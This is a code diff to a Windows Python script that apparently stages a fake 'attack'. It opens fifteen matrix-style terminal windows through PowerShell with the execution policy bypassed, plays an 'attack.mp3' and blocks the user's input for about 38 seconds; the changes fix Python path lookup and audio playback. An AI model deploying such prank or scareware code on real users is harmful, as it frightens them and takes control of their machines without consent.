@@ -294,6 +294,47 @@ while True:
     with open(temp_file, 'w', encoding='utf-8') as f:
         f.write(matrix_script)
     
+    # Get Python executable path ONCE before the loop - use sys.executable if available, otherwise try common paths
+    python_exe = sys.executable
+    if not python_exe or not os.path.exists(python_exe):
+        # Try common Python paths
+        username = os.environ.get('USERNAME', '')
+        python_paths = [
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python310', 'python.exe'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python311', 'python.exe'),
+            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python312', 'python.exe'),
+            r'C:\Python310\python.exe',
+            r'C:\Python311\python.exe',
+            r'C:\Python312\python.exe',
+            r'C:\Program Files\Python310\python.exe',
+            r'C:\Program Files\Python311\python.exe',
+            r'C:\Program Files\Python312\python.exe',
+        ]
+        if username:
+            python_paths.extend([
+                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python310\python.exe',
+                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python311\python.exe',
+                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python312\python.exe',
+            ])
+        for path in python_paths:
+            if os.path.exists(path):
+                python_exe = path
+                print(f"    [*] Found Python at: {python_exe}")
+                break
+        else:
+            # Last resort: use 'python' and hope it's in PATH
+            python_exe = 'python'
+            print("    [*] Using 'python' command (must be in PATH)")
+    else:
+        print(f"    [*] Using Python: {python_exe}")
+    
+    # Escape Python path for PowerShell - handle quotes properly
+    if ' ' in python_exe or python_exe == 'python':
+        # If path has spaces or is just 'python', wrap in quotes
+        python_exe_escaped = f'"{python_exe}"'.replace('\\', '\\\\').replace('"', '\\"')
+    else:
+        python_exe_escaped = python_exe.replace('\\', '\\\\').replace('"', '\\"')
+    
     matrix_processes = []
     
     for i in range(15):
@@ -312,7 +353,7 @@ while True:
         # Create PowerShell command to position the terminal
         # Use /K to keep terminal open, and add pause at end of script
         ps_cmd = '''
-$process = Start-Process cmd -ArgumentList '/K', 'color 0a && python "%s" && pause' -PassThru
+$process = Start-Process cmd -ArgumentList '/K', 'color 0a && "%s" "%s" && pause' -PassThru
 Start-Sleep -Milliseconds 500
 Add-Type @"
 using System;
@@ -337,7 +378,7 @@ if ($hwnd -ne [IntPtr]::Zero) {
     [Win32]::ShowWindow($hwnd, 4)
     [Win32]::MoveWindow($hwnd, %d, %d, 850, 450, $true)
 }
-''' % (temp_file, x, y)
+''' % (python_exe_escaped, temp_file.replace("\\", "\\\\"), x, y)
         
         process = subprocess.Popen(
             ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
@@ -601,8 +642,8 @@ def play_attack_audio():
     
     if not audio_path:
         user_home = os.path.expanduser("~")
-        expected_path1 = os.path.join(user_home, "Audios", "attack.mp3")
-        expected_path2 = os.path.join(user_home, "Audios", "Photos", "attack.mp3")
+        expected_path1 = os.path.join(user_home, "Photos", "attack.mp3")
+        expected_path2 = os.path.join(user_home, "Audios", "attack.mp3")
         print("    [!] attack.mp3 not found")
         print(f"    [!] Expected location: {expected_path1}")
         print("    [!] Searched in locations:")
@@ -621,8 +662,10 @@ def play_attack_audio():
             print(f"      - {os.path.join(p, 'attack.mp3')}")
         # If audio not found, continue attack but without audio (don't stop immediately)
         print("    [!] Continuing attack without audio...")
+        print("    [*] Attack will run for 38 seconds (simulated audio duration)...")
         # Wait for a reasonable duration (38 seconds) before stopping
         time.sleep(38)
+        print("    [*] Simulated audio duration complete - stopping attack...")
         input_blocking_active = False
         return
     
@@ -631,37 +674,64 @@ def play_attack_audio():
     print("    [*] Attack will stop immediately when audio ends!")
     
     # Play using PowerShell MediaPlayer (same as meme_audios.py)
-    ps_script = '''
-Add-Type -AssemblyName presentationCore
-$player = New-Object System.Windows.Media.MediaPlayer
-$player.Open('%s')
-$player.Volume = 1.0
-$player.Play()
-Start-Sleep -Milliseconds 500
-$timeout = 0
-while ($player.NaturalDuration.HasTimeSpan -eq $false -and $timeout -lt 30) {
-    Start-Sleep -Milliseconds 100
-    $timeout++
-}
-if ($player.NaturalDuration.HasTimeSpan) {
-    $duration = [math]::Ceiling($player.NaturalDuration.TimeSpan.TotalSeconds)
-    Start-Sleep -Seconds $duration
-}
-$player.Stop()
-$player.Close()
-''' % audio_path.replace("'", "''").replace("\\", "\\\\")
+    # Use absolute path and ensure proper escaping
+    audio_path_escaped = audio_path.replace("'", "''").replace("\\", "\\\\").replace('"', '`"')
+    ps_script = f'''
+$ErrorActionPreference = "Stop"
+try {{
+    Add-Type -AssemblyName presentationCore
+    $player = New-Object System.Windows.Media.MediaPlayer
+    $audioPath = "{audio_path_escaped}"
+    Write-Host "[Audio] Opening: $audioPath"
+    $player.Open($audioPath)
+    $player.Volume = 1.0
+    $player.Play()
+    Start-Sleep -Milliseconds 500
+    
+    # Wait for duration to be available
+    $timeout = 0
+    while ($player.NaturalDuration.HasTimeSpan -eq $false -and $timeout -lt 50) {{
+        Start-Sleep -Milliseconds 100
+        $timeout++
+    }}
+    
+    if ($player.NaturalDuration.HasTimeSpan) {{
+        $duration = [math]::Ceiling($player.NaturalDuration.TimeSpan.TotalSeconds)
+        Write-Host "[Audio] Duration: $duration seconds"
+        Start-Sleep -Seconds $duration
+    }} else {{
+        Write-Host "[Audio] Duration not available, playing for 38 seconds"
+        Start-Sleep -Seconds 38
+    }}
+    
+    $player.Stop()
+    $player.Close()
+    Write-Host "[Audio] Playback complete"
+}} catch {{
+    Write-Host "[Audio] Error: $_"
+    # Fallback: wait 38 seconds even if playback fails
+    Start-Sleep -Seconds 38
+}}
+'''
     
     try:
-        subprocess.run(
-            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
+        result = subprocess.run(
+            ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', ps_script],
             capture_output=True,
-            timeout=45  # 38 seconds + buffer
+            text=True,
+            timeout=50  # 38 seconds + buffer
         )
+        if result.stdout:
+            print(f"    [*] Audio output: {result.stdout.strip()}")
+        if result.stderr:
+            print(f"    [*] Audio errors: {result.stderr.strip()}")
         print("    [OK] Audio playback complete!")
     except subprocess.TimeoutExpired:
         print("    [OK] Audio playback completed (timeout)")
     except Exception as e:
         print(f"    [!] Error playing audio: {str(e)}")
+        print("    [*] Continuing attack for 38 seconds without audio...")
+        time.sleep(38)
     finally:
         # STOP ATTACK IMMEDIATELY WHEN AUDIO ENDS
         print("    [*] Stopping attack immediately...")
